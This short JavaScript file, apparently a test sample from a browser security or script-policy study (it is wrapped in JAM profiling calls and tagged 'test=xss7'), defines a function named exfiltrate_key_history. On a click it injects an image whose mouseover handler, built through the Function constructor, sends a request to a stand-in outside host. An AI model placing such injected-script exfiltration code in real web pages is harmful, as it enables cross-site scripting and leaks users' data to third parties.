
JAM.startProfile('load');
function exfiltrate_key_history() {
  var script = document.createElement("img");
  script.src = "#";
  var v3 = JAM.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss7",true);xmlhttp.send(null);']);
  JAM.set(script, "onmouseover", v3);
  script.height = "50";
  script.width = "50";
  script.alt = "image";
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  JAM.call(v0.appendChild, v0, [script]);
  return;
}
var v1 = document.getElementById("test");
JAM.set(v1, "onclick", exfiltrate_key_history)

JAM.stopProfile('load');
